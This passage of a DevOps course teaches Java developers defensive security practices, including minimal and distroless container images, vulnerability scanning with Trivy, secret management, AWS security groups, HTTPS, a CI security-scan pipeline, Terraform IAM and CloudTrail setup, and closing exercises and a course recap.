# Alpine Linux is minimal (~5 MB base), only includes what you need

# BEST — Distroless image (no shell, no package manager, nothing extra)
FROM gcr.io/distroless/java17
COPY app.jar /app.jar
CMD ["app.jar"]
# An attacker who breaks in cannot even run "ls" or "bash" — there is no shell!
```

### Rule 3: Scan Images for Vulnerabilities

```bash
# Install Trivy (vulnerability scanner)
brew install trivy   # Mac
# or: apt install trivy   # Ubuntu

# Scan your Docker image
trivy image my-spring-boot-app:latest

# Output:
# my-spring-boot-app:latest
# ========================
# Total: 12 (HIGH: 3, MEDIUM: 7, LOW: 2)
#
# Library       Vulnerability   Severity  Fixed Version
# log4j-core    CVE-2021-44228  CRITICAL  2.17.0
# spring-web    CVE-2024-1234   HIGH      6.1.3
```

Fix: Update the vulnerable dependencies in your `pom.xml` and rebuild.

### Rule 4: No Secrets in Images

```dockerfile
# TERRIBLE — Secret baked into the image
FROM openjdk:17
ENV DB_PASSWORD=SuperSecretPassword123
# Anyone who downloads this image can see the password!

# CORRECT — Pass secrets at runtime
FROM openjdk:17
COPY app.jar /app.jar
CMD ["java", "-jar", "/app.jar"]
# Pass secrets via environment variables when running:
# docker run -e DB_PASSWORD=xxx my-app
```

---

## Secret Management

### The Problem

Secrets (passwords, API keys, tokens) need to be used by your application but MUST NOT be:
- Hardcoded in source code
- Committed to Git
- Stored in Docker images
- Visible in logs

### Real-Life Horror Stories

- **2022**: A developer accidentally committed AWS access keys to a public GitHub repo. Within 30 minutes, crypto miners had spun up hundreds of servers, running up a bill of Rs 50 lakhs ($60,000) before AWS suspended the account.
- **2019**: A company's entire customer database was stolen because the database password was in a public Git repository.

GitHub has automated bots that scan EVERY public commit for API keys and credentials. If you push an AWS key to GitHub, expect it to be exploited within MINUTES.

### Secret Management Tools

| Tool | Best For | How it works |
|------|----------|-------------|
| **AWS Secrets Manager** | AWS-hosted apps | Stores secrets in AWS, SDK fetches them at runtime |
| **HashiCorp Vault** | Multi-cloud, on-prem | Central secret store with access policies, audit logging |
| **Kubernetes Secrets** | K8s workloads | Stores secrets as K8s resources, mounts as env vars or files |
| **GitHub Actions Secrets** | CI/CD pipelines | Encrypted secrets available in GitHub Actions workflows |

### .env Files

`.env` files are for LOCAL development only. They MUST be in `.gitignore`.

```bash
# .env (LOCAL ONLY — never commit this!)
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=devuser
DB_PASSWORD=devpassword123
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...
RAZORPAY_KEY=rzp_test_...
```

```bash
# .gitignore
.env
.env.local
.env.production
*.pem
*.key
```

Your Spring Boot app reads these via `application.yml`:
```yaml
spring:
  datasource:
    url: jdbc:postgresql://${DB_HOST}:${DB_PORT}/mydb
    username: ${DB_USERNAME}
    password: ${DB_PASSWORD}
```

In production, these environment variables are set by:
- Docker: `docker run -e DB_PASSWORD=xxx`
- Kubernetes: Secrets mounted as env vars
- AWS: Secrets Manager, fetched by the app at startup

---

## Network Security

### Firewall Rules (Security Groups)

Security Groups are AWS firewalls. They control which traffic is allowed in and out of your servers.

**Principle of Least Privilege:** Only open the ports you NEED, only to the IPs that NEED access.

```
Web Server Security Group:
  Inbound:
    - Port 443 (HTTPS) from 0.0.0.0/0          — Users need to reach the website
    - Port 22 (SSH) from 203.0.113.0/24          — Only your office IP can SSH
  Outbound:
    - All traffic to 0.0.0.0/0                    — Server can reach the internet

Database Security Group:
  Inbound:
    - Port 5432 (PostgreSQL) from Web Server SG   — Only web servers can connect
  Outbound:
    - None needed (database doesn't initiate connections)
```

**Common mistake:** Opening port 22 (SSH) to `0.0.0.0/0` (the entire internet). This means ANYONE can attempt to SSH into your server. Bots will try thousands of username/password combinations per minute.

### HTTPS Everywhere

**All traffic must use HTTPS (TLS/SSL).** HTTP sends data in plain text — anyone on the network can read it (passwords, credit card numbers, personal data).

**Let's Encrypt** provides free TLS certificates. There is zero excuse for not using HTTPS in 2024.

```bash
# Install Certbot (Let's Encrypt client)
sudo apt install certbot python3-certbot-nginx

# Get a free certificate for your domain
sudo certbot --nginx -d myapp.example.com

# Certbot automatically:
# 1. Gets a certificate from Let's Encrypt
# 2. Configures Nginx to use it
# 3. Sets up auto-renewal (certificates expire every 90 days)
```

### WAF (Web Application Firewall)

A WAF sits in front of your application and blocks malicious requests before they reach your server.

- Blocks SQL injection attempts
- Blocks XSS attempts
- Blocks DDoS attacks (too many requests from one IP)
- Blocks requests from known malicious IPs
- Rate limiting (max 100 requests per minute per IP)

AWS WAF can be attached to your Application Load Balancer or CloudFront distribution.

---

## Security Scanning in CI/CD

Automate security checks so they run on every commit. Developers don't need to remember to run security tools — they run automatically.

### Types of Security Scans

| Type | When | What it does | Tool |
|------|------|-------------|------|
| **SAST** (Static) | At build | Scans SOURCE CODE for vulnerabilities | SonarQube, Snyk, Checkmarx |
| **SCA** (Composition) | At build | Checks DEPENDENCIES for known vulnerabilities | Snyk, Dependabot, OWASP Dependency-Check |
| **DAST** (Dynamic) | After deploy | Scans the RUNNING APP for vulnerabilities | OWASP ZAP, Burp Suite |
| **Container** | At build | Scans DOCKER IMAGES for vulnerable packages | Trivy, Snyk Container |
| **Secret** | At commit | Checks for SECRETS in code | GitLeaks, TruffleHog |

### GitHub Actions Security Pipeline

```yaml
# .github/workflows/security.yml
name: Security Scans

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  # Job 1: Check for secrets in code
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0    # Full history for thorough scanning

      - name: Run GitLeaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        # Scans all commits for accidentally committed secrets

  # Job 2: Scan dependencies for known vulnerabilities
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          java-version: "17"
          distribution: "temurin"

      - name: Run OWASP Dependency-Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          path: "."
          format: "HTML"
          args: "--failOnCVSS 7"
          # Fail the build if any dependency has a vulnerability score >= 7 (HIGH)

      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: dependency-check-report
          path: reports/

  # Job 3: Static code analysis
  sast-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: SonarQube Scan
        uses: SonarSource/sonarqube-scan-action@master
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        # Scans code for security vulnerabilities, code smells, and bugs

  # Job 4: Scan Docker image
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t my-app:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "my-app:${{ github.sha }}"
          format: "table"
          exit-code: "1"              # Fail the build if vulnerabilities found
          severity: "CRITICAL,HIGH"   # Only fail on Critical and High
```

This pipeline runs on every push and pull request. If ANY security issue is found, the build fails and the developer must fix it before merging.

---

## AWS Security Best Practices

### 1. Enable MFA on Everything

MFA (Multi-Factor Authentication) means you need two things to log in: your password AND a code from your phone. Even if someone steals your password, they cannot log in without your phone.

Enable MFA on:
- The root AWS account (CRITICAL — root can do EVERYTHING)
- All IAM user accounts
- Any account that can make changes

### 2. Use IAM Roles, Not Access Keys

**Bad:** Creating an access key and putting it in your application code or environment variables. If leaked, anyone can use it.

**Good:** Assigning an IAM Role to your EC2 instance. The instance automatically gets temporary credentials that rotate every few hours. No keys to leak.

```hcl
# Terraform — Assign IAM role to EC2 instance
resource "aws_iam_role" "ec2_role" {
  name = "ec2-app-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action    = "sts:AssumeRole"
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "s3_access" {
  role       = aws_iam_role.ec2_role.name
  policy_arn = "arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
  # Only give the permissions that are actually needed — nothing more
}

resource "aws_iam_instance_profile" "ec2_profile" {
  name = "ec2-app-profile"
  role = aws_iam_role.ec2_role.name
}

resource "aws_instance" "web" {
  ami                  = "ami-xxx"
  instance_type        = "t3.micro"
  iam_instance_profile = aws_iam_instance_profile.ec2_profile.name
  # The EC2 instance can now access S3 without any access keys!
}
```

### 3. Enable CloudTrail

CloudTrail logs EVERY API call made in your AWS account. Who created that EC2 instance? Who deleted that S3 bucket? When did someone change the security group? CloudTrail knows.

```hcl
resource "aws_cloudtrail" "main" {
  name                       = "main-trail"
  s3_bucket_name             = aws_s3_bucket.cloudtrail_logs.id
  include_global_service_events = true   # Log IAM, CloudFront, etc.
  is_multi_region_trail      = true      # Log in ALL regions
  enable_logging             = true
}
```

### 4. Enable GuardDuty

GuardDuty is AWS's threat detection service. It continuously monitors your account for:
- Unusual API calls (someone trying to escalate privileges)
- Crypto-mining activity on your instances
- Communication with known malicious IPs
- Unauthorized access attempts

```hcl
resource "aws_guardduty_detector" "main" {
  enable = true
}
```

It is essentially free for most workloads (pennies per month). There is no reason not to enable it.

### 5. Encrypt Everything

**At rest:** Enable encryption on all databases (RDS), all S3 buckets, all EBS volumes. AWS manages the encryption keys for free (KMS).

**In transit:** Use HTTPS/TLS for all communication. Between services, use internal TLS or VPC endpoints.

### 6. Regular Security Audits

- Review IAM policies quarterly — remove permissions that are no longer needed
- Review security groups monthly — close ports that should not be open
- Run AWS Trusted Advisor — it flags security issues automatically
- Enable AWS Config — tracks configuration changes across all resources

---

## Common Mistakes

### Monitoring Mistakes

1. **No monitoring at all** — "We'll set it up later." Then production goes down and nobody knows why.
2. **Monitoring but no alerting** — Having beautiful dashboards that nobody looks at. Alerts are what save you at 3 AM.
3. **Too many alerts (alert fatigue)** — If everything alerts, people start ignoring alerts. Only alert on things that require human action.
4. **Only monitoring infrastructure, not application** — CPU at 10% and app returning 500 errors. Infrastructure is fine; the app is broken. Monitor BOTH.
5. **Not tracking business metrics** — Orders per minute dropping 50% is a critical issue, even if all servers are "healthy."
6. **Metrics without context** — "CPU is at 90%" — is that good or bad? Set thresholds and baselines.

### Security Mistakes

1. **Hardcoding secrets in code** — This is the number one security mistake. Use environment variables and secret managers.
2. **Running containers as root** — Always use a non-root user in your Dockerfile.
3. **Not scanning dependencies** — Your code might be secure, but the library you imported has a critical vulnerability.
4. **Security as an afterthought** — "We'll add security before launch." By then, the architecture makes it hard to add.
5. **Trusting user input** — NEVER trust input from users, URLs, headers, or any external source. Validate and sanitize everything.
6. **Same password for everything** — Use different credentials for dev, staging, and production. Use a password manager.
7. **Not rotating credentials** — API keys and passwords should be rotated regularly (every 90 days is common).

---

## Practice Exercises

### Exercise 1: Prometheus + Grafana for Spring Boot

1. Add `spring-boot-starter-actuator` and `micrometer-registry-prometheus` to your Spring Boot app
2. Configure the `/actuator/prometheus` endpoint
3. Run Prometheus and Grafana using Docker Compose
4. Configure Prometheus to scrape your app
5. Import the "JVM Micrometer" dashboard (ID: 4701) in Grafana
6. Verify you can see JVM metrics (heap, threads, GC)

### Exercise 2: Custom Grafana Dashboard

Build a dashboard with 4 rows:
- **Row 1**: Request rate, error rate, p95 latency, uptime
- **Row 2**: JVM heap used vs max, GC pause time, thread count
- **Row 3**: CPU usage, memory usage, disk usage
- **Row 4**: Add custom business metrics (e.g., orders per minute)

### Exercise 3: Alerting to Slack

1. Create a Slack webhook URL
2. Configure AlertManager to send alerts to Slack
3. Create alerting rules:
   - Error rate > 5% for 5 minutes
   - p95 latency > 1 second for 5 minutes
   - Disk usage > 85%
4. Simulate a failure (throw exceptions in your app) and verify you get a Slack notification

### Exercise 4: SonarQube Code Analysis

1. Run SonarQube locally using Docker: `docker run -d -p 9000:9000 sonarqube:community`
2. Create a project in SonarQube
3. Add the SonarQube Maven plugin to your pom.xml
4. Run `mvn sonar:sonar` to analyze your code
5. Review the findings: bugs, vulnerabilities, code smells, coverage
6. Fix at least 3 issues and re-run the analysis

### Exercise 5: Docker Image Scanning with Trivy

1. Install Trivy (`brew install trivy` or `apt install trivy`)
2. Build your Spring Boot Docker image
3. Scan it: `trivy image my-app:latest`
4. Review the vulnerabilities found
5. Fix at least the CRITICAL and HIGH vulnerabilities (update base image, update dependencies)
6. Re-scan and verify the vulnerabilities are resolved

### Exercise 6: Structured Logging with ELK

1. Add `logstash-logback-encoder` to your Spring Boot app
2. Configure JSON logging output
3. Run Elasticsearch, Logstash, and Kibana using Docker Compose
4. Send your app's logs to Logstash
5. Search your logs in Kibana
6. Create a Kibana dashboard showing: error count over time, top error messages, logs by service

---

## Key Takeaways

| Concept | One-Line Summary |
|---------|-----------------|
| Metrics | Numbers over time — CPU, memory, request rate, error rate, latency |
| Logs | Detailed event records — what happened, when, where, why |
| Traces | Following one request through multiple services to find bottlenecks |
| Prometheus | Collects and stores metrics by scraping endpoints |
| Grafana | Makes metrics beautiful and understandable with dashboards |
| ELK Stack | Collects, stores, and searches logs at scale |
| Alerting | Automated notifications when metrics cross thresholds |
| SLI/SLO/SLA | Measure reliability, set targets, make contractual promises |
| OWASP Top 10 | The most critical web application security risks |
| DevSecOps | Security checks at every stage, not just at the end |
| SAST/DAST/SCA | Static code analysis, dynamic app testing, dependency checking |
| Secret Management | Never hardcode secrets — use vaults and environment variables |
| Container Security | Non-root user, minimal images, vulnerability scanning |
| Least Privilege | Give the minimum permissions needed — nothing more |

---

## What You Have Learned in 8 Weeks

| Week | Topic | What You Can Do Now |
|------|-------|-------------------|
| 1 | Linux & Networking | Navigate servers, understand DNS/HTTP/TCP |
| 2 | Git Advanced | Branch strategies, rebasing, team workflows |
| 3 | Docker | Containerize any application, write Dockerfiles, use Compose |
| 4 | Kubernetes | Deploy to K8s, manage pods/services/deployments |
| 5 | AWS Cloud | Use EC2, S3, RDS, VPC, IAM, ELB |
| 6 | CI/CD | Automate build/test/deploy with GitHub Actions |
| 7 | Infrastructure as Code | Create entire environments with Terraform and Ansible |
| 8 | Monitoring & Security | Monitor apps with Prometheus/Grafana, secure everything |

**You are now a Java developer with serious DevOps skills.** You can take a Spring Boot application from code on your laptop to a monitored, secured, automatically deployed application running in the cloud. That is the full picture.
